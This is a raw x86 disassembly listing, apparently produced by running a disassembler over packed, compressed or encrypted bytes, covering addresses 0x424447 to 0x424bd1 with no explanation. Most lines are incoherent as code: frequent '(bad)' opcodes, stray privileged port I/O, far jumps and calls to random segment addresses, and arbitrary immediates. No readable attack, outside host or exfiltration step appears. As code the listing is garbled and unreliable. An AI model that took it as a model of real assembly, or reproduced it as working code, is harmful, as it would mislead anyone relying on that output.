  424447:	sub    DWORD PTR [edi],esp
  424449:	test   BYTE PTR [edx],0xa
  42444c:	lods   eax,DWORD PTR ds:[esi]
  42444d:	and    al,0x52
  42444f:	shl    DWORD PTR [eax+0x49d53768],1
  424455:	adc    ecx,esp
  424457:	inc    edi
  424458:	fcmovu st,st(1)
  42445a:	add    BYTE PTR [esi+0x78],0xc0
  42445e:	mov    ecx,0xea1e6996
  424463:	mov    dl,0xba
  424465:	cmp    DWORD PTR [eax],eax
  424467:	push   ds
  424468:	(bad)  
  424469:	dec    ebp
  42446a:	(bad)  
  42446b:	cmp    cl,BYTE PTR [ebp+ebx*2-0xd491bfd]
  424472:	lds    ebp,FWORD PTR [ebp+0x2e]
  424475:	sbb    eax,0xbb82ac90
  42447a:	pop    ebp
  42447b:	lods   eax,DWORD PTR ds:[esi]
  42447c:	adc    bl,BYTE PTR es:[edi-0x7b11f9fa]
  424483:	stos   BYTE PTR es:[edi],al
  424484:	sbb    ch,BYTE PTR [edx-0xe]
  424487:	loopne 0x4244aa
  424489:	jmp    0x6883079e
  42448e:	xor    eax,0x37a6eed8
  424493:	cdq    
  424494:	xchg   esi,eax
  424495:	sti    
  424496:	jns    0x4244f5
  424498:	lahf   
  424499:	mov    edx,0xa4e85ca7
  42449e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42449f:	mov    ebp,DWORD PTR [ecx+edi*4+0x85576f2]
  4244a6:	out    0xe7,al
  4244a8:	pop    edi
  4244a9:	add    ah,0x54
  4244ac:	push   edx
  4244ad:	call   0x336dbc15
  4244b2:	mov    eax,ds:0x5d067dcf
  4244b7:	neg    BYTE PTR [edi+0x792beea6]
  4244bd:	call   0xe1d8:0x4ce6e072
  4244c4:	icebp  
  4244c5:	in     al,dx
  4244c6:	(bad)  
  4244c7:	stc    
  4244c8:	cmp    eax,ebx
  4244ca:	std    
  4244cb:	aas    
  4244cc:	inc    BYTE PTR [ecx-0x15f8190a]
  4244d2:	arpl   WORD PTR [ebp+0x51],cx
  4244d5:	jmp    0x3ecc:0x22c2d09d
  4244dc:	std    
  4244dd:	xchg   edx,eax
  4244de:	push   ss
  4244df:	imul   esi,DWORD PTR [ebp+0x7e],0xffffffda
  4244e3:	lods   eax,DWORD PTR ds:[esi]
  4244e4:	cmc    
  4244e5:	aaa    
  4244e6:	sahf   
  4244e7:	xchg   ecx,eax
  4244e8:	sub    BYTE PTR [ecx+ebx*8+0x75],0x92
  4244ed:	or     al,0x6a
  4244ef:	rcl    BYTE PTR [ecx-0x4046ca89],1
  4244f5:	nop
  4244f6:	push   ebx
  4244f7:	rol    BYTE PTR [esi+ecx*4+0x34109be6],0xf
  4244ff:	add    al,0xd6
  424501:	inc    edi
  424502:	xlat   BYTE PTR ds:[ebx]
  424503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424504:	inc    ebp
  424505:	icebp  
  424506:	dec    ebx
  424507:	inc    ecx
  424508:	imul   esi,esp,0x6262b55a
  42450e:	inc    edx
  42450f:	mov    eax,0xa9675ef2
  424514:	mov    ds:0xfd060ae5,eax
  424519:	pushf  
  42451a:	scas   al,BYTE PTR es:[edi]
  42451b:	fimul  WORD PTR [ebx]
  42451d:	dec    ecx
  42451e:	ror    DWORD PTR [esi+0x2cea1a6],0x80
  424525:	test   ch,ah
  424527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424528:	rcr    BYTE PTR [eax-0x785193b7],1
  42452e:	inc    ebx
  42452f:	jne    0x4244d9
  424531:	mov    dl,0x17
  424533:	jns    0x4244e2
  424535:	dec    esp
  424536:	sub    BYTE PTR [edi+0x5867d0a8],dh
  42453c:	or     eax,0xe9b4863
  424541:	into   
  424542:	scas   al,BYTE PTR es:[edi]
  424543:	jl     0x4244f1
  424545:	mov    ebp,es
  424547:	loope  0x42450b
  424549:	sbb    BYTE PTR [esi-0xdfdd119],dl
  42454f:	dec    esi
  424550:	mov    edx,0x39cbe275
  424555:	jbe    0x424590
  424557:	jb     0x4245b4
  424559:	push   edx
  42455a:	and    ebx,DWORD PTR [edx+0x66]
  42455d:	data16 mov WORD PTR [ebp+0xfc7f5eb],gs
  424564:	mov    al,ds:0xd6d9f40d
  424569:	es or  al,0x50
  42456c:	adc    bl,BYTE PTR [edi+0x68]
  42456f:	into   
  424570:	scas   eax,DWORD PTR es:[edi]
  424571:	xchg   ebx,eax
  424572:	addr16 mov ds:0xc908,al
  424576:	ss mov dl,0xf8
  424579:	sbb    al,0x92
  42457b:	jnp    0x424536
  42457d:	nop
  42457e:	mov    dh,0xe5
  424580:	sub    eax,0x3a05f12e
  424585:	cmp    al,0x7f
  424587:	mov    edx,0xbc0dabd6
  42458c:	mov    edi,0xd6f8628c
  424591:	repz jle 0x4245ab
  424594:	arpl   WORD PTR [esi],si
  424596:	repnz mov bh,0x2a
  424599:	std    
  42459a:	inc    eax
  42459b:	retf   0x6870
  42459e:	mov    ebx,DWORD PTR [ebp+0x5e9f2e87]
  4245a4:	enter  0xf7dc,0xc4
  4245a8:	mov    ds:0xa36c1634,al
  4245ad:	scas   al,BYTE PTR es:[edi]
  4245ae:	xor    BYTE PTR [esi-0x5a],dl
  4245b1:	ins    DWORD PTR es:[edi],dx
  4245b2:	xlat   BYTE PTR ds:[ebx]
  4245b3:	pop    ecx
  4245b4:	cmp    DWORD PTR [edx],esp
  4245b6:	push   ebx
  4245b7:	or     dl,0xe2
  4245ba:	shl    DWORD PTR [ebx-0x3f],0xc2
  4245be:	mov    ds:0xab0b6357,eax
  4245c3:	sbb    al,0x53
  4245c5:	inc    eax
  4245c6:	jecxz  0x424636
  4245c8:	shl    ch,1
  4245ca:	std    
  4245cb:	loope  0x42457d
  4245cd:	or     DWORD PTR ds:0xee1cf0d9,0x354e43a4
  4245d7:	ret    
  4245d8:	dec    ebx
  4245d9:	sar    DWORD PTR [ebx-0x5e339e51],1
  4245df:	arpl   WORD PTR [ebx-0x41],dx
  4245e2:	sahf   
  4245e3:	push   0x968ea5c6
  4245e8:	or     eax,DWORD PTR [ecx]
  4245ea:	cmp    esp,0x651faa11
  4245f0:	pop    es
  4245f1:	and    bl,al
  4245f3:	in     eax,0xc
  4245f5:	push   DWORD PTR [edi]
  4245f7:	(bad)  [edx+0x15e73b96]
  4245fd:	test   cl,bh
  4245ff:	add    ch,BYTE PTR [ecx+edi*1-0x138c548a]
  424606:	lods   eax,DWORD PTR ds:[esi]
  424607:	and    dh,BYTE PTR [edx]
  424609:	xlat   BYTE PTR ds:[ebx]
  42460a:	jecxz  0x424636
  42460c:	mov    eax,esp
  42460e:	(bad)  
  42460f:	popf   
  424610:	loop   0x424593
  424612:	out    0x1a,al
  424614:	ja     0x424606
  424616:	xchg   edi,eax
  424617:	or     esi,DWORD PTR [edx-0x10]
  42461a:	stos   BYTE PTR es:[edi],al
  42461b:	inc    ebp
  42461c:	mov    edx,ds
  42461e:	dec    edx
  42461f:	ret    
  424620:	imul   esp,edx,0x7d
  424623:	out    0x3e,al
  424625:	(bad)  
  424627:	lods   al,BYTE PTR ds:[esi]
  424628:	push   esp
  424629:	(bad)  [ebp-0xc2bcf3d]
  42462f:	clc    
  424630:	sub    BYTE PTR [esi],0x96
  424633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424634:	dec    esp
  424635:	push   0x4710b0d5
  42463a:	popa   
  42463b:	sub    BYTE PTR [esi-0x572e0154],al
  424641:	es xor al,0x9e
  424644:	js     0x42464f
  424646:	jecxz  0x42465e
  424648:	mov    esi,0x32995988
  42464d:	mov    ebx,0xffaa645b
  424652:	enter  0xf068,0xbb
  424656:	or     DWORD PTR [ecx-0x791bb238],edx
  42465c:	xchg   BYTE PTR [edi],dl
  42465e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42465f:	jae    0x42460b
  424661:	in     al,0x13
  424663:	fild   DWORD PTR [ecx+0x2c78c437]
  424669:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42466a:	or     BYTE PTR [esi+ebp*4],al
  42466d:	in     al,0x5d
  42466f:	add    DWORD PTR [edx+0x6],edi
  424672:	sub    cl,BYTE PTR [edx]
  424674:	xor    DWORD PTR [edi-0x64],ebx
  424677:	xor    BYTE PTR [edi+0x1561f5c4],ah
  42467d:	and    eax,0xcd0a43e0
  424682:	mov    edi,0x875a3148
  424687:	fstp   QWORD PTR [eax+0x3185cc7a]
  42468d:	mov    WORD PTR [esi],ss
  42468f:	xor    dl,ch
  424691:	pop    ds
  424692:	pop    ebp
  424693:	add    ah,BYTE PTR [edx+0x5f]
  424696:	std    
  424697:	stos   BYTE PTR es:[edi],al
  424698:	dec    edi
  424699:	addr16 test eax,0xb46cb0d7
  42469f:	pusha  
  4246a0:	jl     0x4246fb
  4246a2:	shl    DWORD PTR [ecx-0x4f],1
  4246a5:	je     0x42470d
  4246a7:	or     edx,DWORD PTR [ebx-0x5267b7e]
  4246ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246ae:	js     0x4246f3
  4246b0:	push   ss
  4246b1:	mov    ds:0xe29e3b5,al
  4246b6:	xor    ebp,0x1e
  4246b9:	inc    esi
  4246ba:	(bad)  [ebx]
  4246bc:	xchg   ecx,eax
  4246bd:	mov    esi,0x28f595bc
  4246c2:	(bad)  
  4246c3:	das    
  4246c4:	sbb    al,0x9a
  4246c6:	leave  
  4246c7:	aam    0x57
  4246c9:	pop    ds
  4246ca:	scas   al,BYTE PTR es:[edi]
  4246cb:	inc    ecx
  4246cc:	mov    ebp,gs
  4246ce:	(bad)  
  4246cf:	ins    DWORD PTR es:[edi],dx
  4246d0:	(bad)  
  4246d1:	sahf   
  4246d2:	inc    DWORD PTR [eax+0x2]
  4246d5:	out    0xc8,eax
  4246d7:	inc    edx
  4246d8:	sti    
  4246d9:	push   ebx
  4246da:	xchg   edi,eax
  4246db:	scas   eax,DWORD PTR es:[edi]
  4246dc:	pop    esi
  4246dd:	jnp    0x424746
  4246df:	sbb    DWORD PTR [ecx+0x35333a78],ebp
  4246e5:	iret   
  4246e6:	adc    al,0xf
  4246e8:	pop    ecx
  4246e9:	mov    edx,0x2a736ddc
  4246ee:	inc    edi
  4246ef:	sti    
  4246f0:	add    DWORD PTR [esi],esp
  4246f2:	push   ebx
  4246f3:	xor    ch,dl
  4246f5:	gs idiv DWORD PTR ds:[edi-0x73]
  4246fa:	xor    BYTE PTR [esi+0xe],al
  4246fd:	inc    esi
  4246fe:	gs cmc 
  424700:	sub    BYTE PTR [ecx-0x1a],cl
  424703:	push   ebx
  424704:	push   0x23
  424706:	jg     0x424728
  424708:	dec    eax
  424709:	sbb    edx,DWORD PTR [esi-0x7]
  42470c:	lock mul cl
  42470f:	sub    eax,0xf36d6ebf
  424714:	daa    
  424715:	mov    esi,0xd7971241
  42471a:	push   es
  42471b:	div    edx
  42471d:	aas    
  42471e:	leave  
  42471f:	push   cs
  424720:	scas   al,BYTE PTR es:[edi]
  424721:	jg     0x42477c
  424723:	or     DWORD PTR [ebp-0x4f314a43],esp
  424729:	xchg   ebp,eax
  42472a:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  42472c:	sub    BYTE PTR [ecx-0x2],bl
  42472f:	mov    al,ds:0xf652623
  424734:	fcom   DWORD PTR [edx]
  424736:	mov    al,0xe3
  424738:	fimul  WORD PTR [esi-0x17]
  42473b:	xlat   BYTE PTR ds:[ebx]
  42473c:	ins    DWORD PTR es:[edi],dx
  42473d:	or     dl,BYTE PTR [esi-0x41e76100]
  424743:	fbld   TBYTE PTR [eax]
  424745:	sub    bl,dh
  424747:	lock cdq 
  424749:	fadd   QWORD PTR [edx-0x4d]
  42474c:	cmp    al,0xf
  42474e:	push   0x78
  424750:	mov    edx,0xe89206bc
  424755:	jno    0x42478a
  424757:	cmp    esi,esi
  424759:	lock loopne 0x42470b
  42475c:	add    ch,ah
  42475e:	cmp    BYTE PTR [esp+eax*8-0xb9d056a],ah
  424765:	out    dx,al
  424766:	sbb    DWORD PTR [esi+0x420b275a],ebx
  42476c:	pop    ss
  42476d:	jno    0x4247a3
  42476f:	pop    ebp
  424770:	mov    cl,0xeb
  424772:	dec    ebp
  424773:	aad    0x36
  424775:	inc    ebp
  424776:	scas   eax,DWORD PTR es:[edi]
  424777:	rcr    BYTE PTR [ebx-0x2fba99ae],0x5b
  42477e:	xchg   ecx,eax
  42477f:	outs   dx,BYTE PTR ds:[esi]
  424780:	nop
  424781:	jne    0x4247d4
  424783:	push   ds
  424784:	sbb    DWORD PTR [ebx],ebx
  424786:	adc    ch,BYTE PTR [ecx-0x5ea6cf5d]
  42478c:	adc    ebx,DWORD PTR [ebx]
  42478e:	std    
  42478f:	aaa    
  424790:	(bad)  
  424791:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424792:	adc    eax,0x157f7386
  424797:	xor    esi,DWORD PTR [esi-0x5a06369]
  42479d:	pop    edi
  42479e:	push   esp
  42479f:	dec    eax
  4247a0:	(bad)  
  4247a1:	mov    WORD PTR [edx+edi*1],?
  4247a4:	pop    edi
  4247a5:	and    dh,bh
  4247a7:	test   DWORD PTR [edi+0x75],0xadc7ce9
  4247ae:	push   0x14
  4247b0:	mov    ah,0xa8
  4247b2:	lods   eax,DWORD PTR ds:[esi]
  4247b3:	sub    edx,DWORD PTR [esi-0x52]
  4247b6:	out    0x29,al
  4247b8:	inc    eax
  4247b9:	and    ah,dl
  4247bb:	std    
  4247bc:	out    dx,al
  4247bd:	rcl    BYTE PTR [eax-0x13],0xd1
  4247c1:	shr    dh,1
  4247c3:	mov    WORD PTR ds:0x79737aee,gs
  4247c9:	sbb    ecx,DWORD PTR [esi-0x4432b3c5]
  4247cf:	test   BYTE PTR [ebx],bl
  4247d1:	sbb    DWORD PTR [esi-0x27],edi
  4247d4:	xor    eax,DWORD PTR [eax+0x6]
  4247d7:	outs   dx,DWORD PTR ds:[esi]
  4247d8:	rcr    ch,1
  4247da:	fadd   st(5),st
  4247dc:	loope  0x424842
  4247de:	aad    0x4f
  4247e0:	stc    
  4247e1:	and    ebx,esp
  4247e3:	popf   
  4247e4:	sub    ah,BYTE PTR [ecx+0x40]
  4247e7:	push   es
  4247e8:	in     eax,dx
  4247e9:	mov    ebx,0x43413736
  4247ee:	mov    al,al
  4247f0:	loope  0x42478d
  4247f2:	mov    ebx,0x53cf7eaf
  4247f7:	ins    BYTE PTR es:[edi],dx
  4247f8:	pop    esp
  4247f9:	push   0xc9d0d4d4
  4247fe:	pop    edi
  4247ff:	add    cl,BYTE PTR [edx]
  424801:	xchg   esi,eax
  424802:	mov    esi,0x942c4fc8
  424807:	(bad)  
  424808:	jmp    edx
  42480a:	mov    ds:0x945d1f8a,al
  42480f:	arpl   WORD PTR [ebx+0x22],cx
  424812:	pop    eax
  424813:	push   cs
  424814:	cmp    BYTE PTR [edx],0x1c
  424817:	sub    al,0x9
  424819:	call   0x98351b2b
  42481e:	(bad)  
  42481f:	imul   esi,DWORD PTR [ecx+ebp*1+0x4601b0e4],0xffffff99
  424827:	mov    dl,0xff
  424829:	lea    eax,[ebp+0xc72513f]
  42482f:	and    BYTE PTR [ecx],dl
  424831:	hlt    
  424832:	inc    eax
  424833:	cli    
  424834:	mov    al,0xcf
  424836:	add    BYTE PTR [edx+0x4e],ch
  424839:	mov    bl,0xe9
  42483b:	dec    ecx
  42483c:	push   cs
  42483d:	mov    eax,0x87c9ec4d
  424842:	loope  0x42480f
  424844:	aad    0x46
  424846:	sbb    edi,DWORD PTR [esi-0x4d]
  424849:	dec    ebx
  42484a:	mov    ch,BYTE PTR [eax-0xa]
  42484d:	xchg   edx,eax
  42484e:	add    dl,BYTE PTR [ebp+0x2e]
  424851:	mov    esi,0xd7b17681
  424856:	xor    edx,DWORD PTR [ebx-0x127739de]
  42485c:	and    DWORD PTR [eax+0x42],ebx
  42485f:	test   DWORD PTR [ebx-0x22],esi
  424862:	dec    ecx
  424863:	popf   
  424864:	ret    
  424865:	arpl   si,sp
  424867:	mov    esi,DWORD PTR [ecx-0x6fe4b21f]
  42486d:	popa   
  42486e:	dec    edx
  42486f:	popf   
  424870:	cwde   
  424871:	ins    DWORD PTR es:[edi],dx
  424872:	or     BYTE PTR [eax],bl
  424874:	xchg   ebp,eax
  424875:	xor    dh,BYTE PTR [edi]
  424877:	push   ebp
  424878:	pusha  
  424879:	call   0x7ddae495
  42487e:	stos   DWORD PTR es:[edi],eax
  42487f:	xlat   BYTE PTR ds:[ebx]
  424880:	jge    0x42489f
  424882:	jne    0x424847
  424884:	xchg   edi,edi
  424886:	add    BYTE PTR [ebp+0x6],bl
  424889:	jg     0x42489e
  42488b:	outs   dx,DWORD PTR ds:[esi]
  42488c:	xor    al,0x19
  42488e:	xchg   esi,eax
  42488f:	or     ah,BYTE PTR [edi-0x4cce4b41]
  424895:	pop    esi
  424896:	cmp    dl,bl
  424898:	sbb    edx,ebx
  42489a:	xchg   esp,eax
  42489b:	out    dx,eax
  42489c:	push   esi
  42489d:	sbb    ch,BYTE PTR [edx]
  42489f:	adc    DWORD PTR [eax],0x59
  4248a2:	add    edx,esi
  4248a4:	or     esp,DWORD PTR [eax-0x2923f4ed]
  4248aa:	test   al,0xcf
  4248ac:	push   esp
  4248ad:	sbb    BYTE PTR [ebp-0x1a],0x3a
  4248b1:	mov    ecx,0x8fd4c87a
  4248b6:	shl    DWORD PTR [ebx-0x3cd58758],1
  4248bc:	mov    edx,0xc984b564
  4248c1:	and    ch,bl
  4248c3:	jmp    0xe0abe54
  4248c8:	cmp    ebx,DWORD PTR [esi+0x4a]
  4248cb:	fadd   DWORD PTR [edx-0x3614d3b2]
  4248d1:	cli    
  4248d2:	jp     0x42491c
  4248d4:	sar    ebp,0xbc
  4248d7:	xor    eax,0x4104d9e3
  4248dc:	fiadd  WORD PTR [edx+0x70]
  4248df:	adc    DWORD PTR [eax+0x30],esp
  4248e2:	loopne 0x42487d
  4248e4:	in     al,dx
  4248e5:	ret    
  4248e6:	mov    dl,0xa0
  4248e8:	mov    eax,ds:0x1c54696e
  4248ed:	ret    0x9da6
  4248f0:	pop    edx
  4248f1:	inc    ebx
  4248f2:	mov    cl,0xf4
  4248f4:	imul   edi,ebx,0xffffffbd
  4248f7:	dec    eax
  4248f8:	pushf  
  4248f9:	stos   BYTE PTR es:[edi],al
  4248fa:	mov    eax,ds:0x12469554
  4248ff:	jp     0x42490b
  424901:	pop    esp
  424902:	lahf   
  424903:	adc    eax,0x720a9d65
  424908:	jo     0x4248f5
  42490a:	das    
  42490b:	mov    WORD PTR [esp+ebx*2],es
  42490e:	dec    ecx
  42490f:	and    ebp,DWORD PTR [edx]
  424911:	add    al,0x1d
  424913:	int3   
  424914:	rcr    esp,cl
  424916:	test   al,0xf8
  424918:	mov    edx,0x96223b8b
  42491d:	aam    0xde
  42491f:	imul   eax,DWORD PTR [ebp-0x4a],0x350c14ea
  424926:	jecxz  0x424994
  424928:	imul   edi,DWORD PTR [edx-0x14],0xffffffc3
  42492c:	xchg   ebp,eax
  42492d:	fisub  DWORD PTR [edi-0x2986ae27]
  424933:	dec    ebp
  424934:	lods   eax,DWORD PTR ds:[esi]
  424935:	je     0x424993
  424937:	mov    esp,0xe7797aea
  42493c:	adc    bh,BYTE PTR [esi]
  42493e:	push   ebx
  42493f:	inc    eax
  424940:	imul   ecx,DWORD PTR [ebx-0x3d5af2dc],0xffffffa6
  424947:	dec    edx
  424948:	jg     0x42495f
  42494a:	imul   esi,DWORD PTR [eax],0xffffff90
  42494d:	popa   
  42494e:	dec    eax
  42494f:	pop    ebx
  424950:	add    DWORD PTR [ecx+0x2761ede8],0x7efe5b73
  42495a:	xor    BYTE PTR [eax-0x1c],dh
  42495d:	cwde   
  42495e:	pop    eax
  42495f:	ins    BYTE PTR es:[edi],dx
  424960:	arpl   WORD PTR [esi-0x3b],bx
  424963:	into   
  424964:	int    0xb3
  424966:	cmc    
  424967:	cs xor al,0xbb
  42496a:	and    DWORD PTR [ebx+0x6e],edx
  42496d:	push   ds
  42496e:	pop    edx
  42496f:	mov    ebp,0xe28b06d7
  424974:	mov    dl,0xb5
  424976:	sbb    DWORD PTR [edi-0x36b8b22b],0x4e649622
  424980:	sub    DWORD PTR [edi-0x4a],0xb9e914b3
  424987:	sbb    al,0xc6
  424989:	mov    ds:0xb991bb5b,eax
  42498e:	(bad)  
  42498f:	(bad)  
  424990:	pop    ecx
  424991:	les    ebx,FWORD PTR [ecx+0x39]
  424994:	dec    edi
  424995:	xbegin 0xd363f3ff
  42499b:	(bad)  
  42499c:	fdiv   QWORD PTR [ebx]
  42499e:	jle    0x424991
  4249a0:	xchg   esp,eax
  4249a1:	push   ecx
  4249a2:	sub    esp,DWORD PTR [ebp-0x14]
  4249a5:	mov    dh,0x44
  4249a7:	push   es
  4249a8:	mov    edx,0xe63f9be3
  4249ad:	xchg   esp,eax
  4249ae:	scas   al,BYTE PTR es:[edi]
  4249af:	pop    DWORD PTR [esi-0x13ab0335]
  4249b5:	(bad)  
  4249b6:	sti    
  4249b7:	sub    cl,BYTE PTR ds:0x716c5dc0
  4249bd:	xchg   edi,eax
  4249be:	jle    0x4249f3
  4249c0:	ss jl  0x4249ff
  4249c3:	add    DWORD PTR ds:0x6555ecef,0x52
  4249ca:	xlat   BYTE PTR ds:[ebx]
  4249cb:	mov    ebp,DWORD PTR ds:0xbeb8d435
  4249d1:	aam    0xf6
  4249d3:	xchg   esp,eax
  4249d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4249d5:	pushf  
  4249d6:	mov    DWORD PTR [ebx-0x114fab86],eax
  4249dc:	addr16 and al,0x36
  4249df:	iret   
  4249e0:	leave  
  4249e1:	ret    
  4249e2:	sub    cl,bl
  4249e4:	hlt    
  4249e5:	dec    edi
  4249e6:	sub    BYTE PTR [eax],al
  4249e8:	dec    esi
  4249e9:	cdq    
  4249ea:	jae    0x42498c
  4249ec:	sub    dl,BYTE PTR [edi+0x69]
  4249ef:	jmp    0xebf3:0x26982336
  4249f6:	mov    ch,0xbf
  4249f8:	add    ebp,DWORD PTR [ebx+eiz*2-0x4c]
  4249fc:	lea    ebx,[edi+0x6a]
  4249ff:	add    edi,DWORD PTR [ecx]
  424a01:	cmp    ebp,ecx
  424a03:	out    0x7a,eax
  424a05:	(bad)  
  424a06:	je     0x424a4c
  424a08:	dec    BYTE PTR [edi]
  424a0a:	jo     0x424a7c
  424a0c:	cmp    bl,BYTE PTR [edx]
  424a0e:	cmp    esp,DWORD PTR [ebp+0x1fa21e97]
  424a14:	mov    edi,0xab58a14f
  424a19:	mov    dl,0x9f
  424a1b:	leave  
  424a1c:	fs stos DWORD PTR es:[edi],eax
  424a1e:	and    al,0xd9
  424a20:	inc    esp
  424a21:	jg     0x4249b7
  424a23:	loopne 0x424a43
  424a25:	(bad)  
  424a26:	in     al,0x9d
  424a28:	ret    
  424a29:	sub    al,0xa
  424a2b:	jp     0x424a99
  424a2d:	iret   
  424a2e:	(bad)  
  424a2f:	sti    
  424a30:	pop    es
  424a31:	(bad)  
  424a33:	ret    
  424a34:	mov    ah,0x1
  424a36:	out    dx,al
  424a37:	mov    esp,0xda0315c0
  424a3c:	add    BYTE PTR [eax],bh
  424a3e:	and    eax,0x3a20dabd
  424a43:	dec    ebx
  424a44:	ds dec ebp
  424a46:	xchg   ebp,eax
  424a47:	(bad)  
  424a48:	mov    bh,0x2a
  424a4a:	pushf  
  424a4b:	imul   edx,DWORD PTR cs:[ebx+0x66]
  424a50:	cs leave 
  424a52:	das    
  424a53:	imul   edi,edx,0x15
  424a56:	outs   dx,BYTE PTR ds:[esi]
  424a57:	(bad)
  424a5a:	or     esi,DWORD PTR [ebp+0x4a9e39e0]
  424a60:	add    DWORD PTR [eax+eax*1+0xd856],esp
  424a67:	add    BYTE PTR [eax],al
  424a69:	add    BYTE PTR [edx+0x41],dl
  424a6c:	push   esp
  424a6d:	push   edx
  424a6e:	push   edi
  424a6f:	push   edi
  424a70:	push   esi
  424a71:	inc    ecx
  424a72:	ror    DWORD PTR [ebx-0x49],1
  424a75:	popf   
  424a76:	push   es
  424a77:	dec    ecx
  424a78:	cdq    
  424a79:	imul   edi,DWORD PTR [edx-0x28],0x1
  424a7d:	add    BYTE PTR [ebx+0x19000006],al
  424a83:	and    BYTE PTR ds:[edx],0xdb
  424a87:	ret    
  424a88:	jle    0x424abe
  424a8a:	retf   0xa7ec
  424a8d:	jle    0x424a81
  424a8f:	push   es
  424a90:	test   al,0xd9
  424a92:	xor    al,0x7
  424a94:	jg     0x424a69
  424a96:	fdiv   QWORD PTR [eax-0x7a6642b0]
  424a9c:	pushf  
  424a9d:	ins    BYTE PTR es:[edi],dx
  424a9e:	dec    edx
  424a9f:	dec    edx
  424aa0:	and    al,0x67
  424aa2:	adc    al,0xb6
  424aa4:	push   edi
  424aa5:	lods   al,BYTE PTR ds:[esi]
  424aa6:	mov    ebp,0x929bccb5
  424aab:	inc    eax
  424aac:	mov    BYTE PTR [edi-0x57],bh
  424aaf:	in     al,dx
  424ab0:	aam    0x24
  424ab2:	pop    edx
  424ab3:	or     DWORD PTR [edx],esi
  424ab5:	cs inc edi
  424ab7:	cmp    eax,0x425b60f3
  424abc:	fsubr  st,st(0)
  424abe:	mov    bh,0xf5
  424ac0:	dec    esp
  424ac1:	or     al,0x31
  424ac3:	xlat   BYTE PTR ds:[ebx]
  424ac4:	mov    DWORD PTR [eax],eax
  424ac6:	inc    al
  424ac8:	mov    eax,ds:0xa04fd54
  424acd:	add    ch,cl
  424acf:	sar    BYTE PTR [edi+eax*4],cl
  424ad2:	lods   eax,DWORD PTR ds:[esi]
  424ad3:	es mov edx,0xe2629a6e
  424ad9:	xchg   edx,eax
  424ada:	inc    ecx
  424adb:	cmp    BYTE PTR [eax],0xed
  424ade:	shr    ebx,0x59
  424ae1:	jl     0x424a74
  424ae3:	mov    eax,0xf448b168
  424ae8:	jle    0x424aec
  424aea:	cdq    
  424aeb:	inc    ecx
  424aec:	sub    al,0x5
  424aee:	scas   eax,DWORD PTR es:[edi]
  424aef:	nop
  424af0:	jle    0x424b1f
  424af2:	push   0x6a
  424af4:	adc    ebp,edx
  424af6:	inc    esp
  424af7:	shr    ebx,0x8b
  424afa:	stos   DWORD PTR es:[edi],eax
  424afb:	mov    ah,0x72
  424afd:	aam    0x19
  424aff:	dec    esp
  424b00:	cwde   
  424b01:	loope  0x424ae6
  424b03:	xor    eax,ebp
  424b05:	jne    0x424b09
  424b07:	outs   dx,BYTE PTR ds:[esi]
  424b08:	lods   al,BYTE PTR ds:[esi]
  424b09:	mov    BYTE PTR [ebx],0x3b
  424b0c:	loop   0x424b54
  424b0e:	out    0x19,eax
  424b10:	xlat   BYTE PTR ds:[ebx]
  424b11:	mov    ah,0x46
  424b13:	imul   eax,DWORD PTR ds:0x17ca7f5e,0xd89d6b3b
  424b1d:	test   BYTE PTR ds:0x1f242e24,dl
  424b23:	push   esi
  424b24:	pop    ss
  424b25:	(bad)  
  424b26:	iret   
  424b27:	cmp    DWORD PTR [ecx+0x5461a7d1],0x3e
  424b2e:	jns    0x424b07
  424b30:	popa   
  424b31:	(bad)  
  424b33:	pop    eax
  424b34:	repnz cli 
  424b36:	(bad)  
  424b37:	mov    dl,0xca
  424b39:	out    dx,al
  424b3a:	mov    ebx,DWORD PTR [ebx-0x78]
  424b3d:	mov    eax,ds:0xe14e468b
  424b42:	sbb    al,BYTE PTR [ebp+0x51991d95]
  424b48:	sbb    bl,ch
  424b4a:	mov    ebx,0x2d6973a
  424b4f:	mov    esi,0x348ca9f3
  424b54:	push   esp
  424b55:	or     al,0x94
  424b57:	jbe    0x424b05
  424b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b5a:	mov    esi,?
  424b5c:	adc    eax,0xa919c3f1
  424b61:	push   eax
  424b62:	mov    esp,0x2f706c75
  424b67:	lods   eax,DWORD PTR ds:[esi]
  424b68:	(bad)  
  424b69:	adc    DWORD PTR [ebx],eax
  424b6b:	lds    ebx,FWORD PTR ds:0x406ec116
  424b71:	pop    esp
  424b72:	mov    cl,0x33
  424b74:	jnp    0x424b6b
  424b76:	mul    DWORD PTR [edx]
  424b78:	jno    0x424be2
  424b7a:	jb     0x424bcf
  424b7c:	or     dh,dh
  424b7e:	add    DWORD PTR [eax-0x2205c4e7],esi
  424b84:	mov    ebp,0xdff10c47
  424b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b8a:	jmp    0x424b8c
  424b8c:	sar    DWORD PTR [ecx],0x4e
  424b8f:	ins    BYTE PTR es:[edi],dx
  424b90:	fnstenv [ebx+0x72]
  424b93:	xchg   ecx,eax
  424b94:	mov    edi,0x6cfad9a8
  424b99:	add    bl,dl
  424b9b:	jecxz  0x424c1a
  424b9d:	cs sub ecx,eax
  424ba0:	test   esp,edx
  424ba2:	popa   
  424ba3:	mov    ebp,0xae76f5be
  424ba8:	js     0x424b68
  424baa:	sahf   
  424bab:	sub    BYTE PTR [esi],bl
  424bad:	push   ebx
  424bae:	mov    bh,0xa6
  424bb0:	and    esp,eax
  424bb2:	aaa    
  424bb3:	fprem  
  424bb5:	jg     0x424ba8
  424bb7:	sub    al,0x82
  424bb9:	and    al,0x2a
  424bbb:	sub    edx,esi
  424bbd:	outs   dx,BYTE PTR ds:[esi]
  424bbe:	test   bl,ah
  424bc0:	add    bl,bl
  424bc2:	test   BYTE PTR [ebx],bh
  424bc4:	jns    0x424bef
  424bc6:	jmp    0x424bb5
  424bc8:	add    DWORD PTR [ecx],edi
  424bca:	xor    bh,dl
  424bcc:	out    dx,eax
  424bcd:	sub    al,0x67
  424bcf:	jns    0x424b5a
  424bd1:	lods   eax,DWORD PTR ds:[esi]
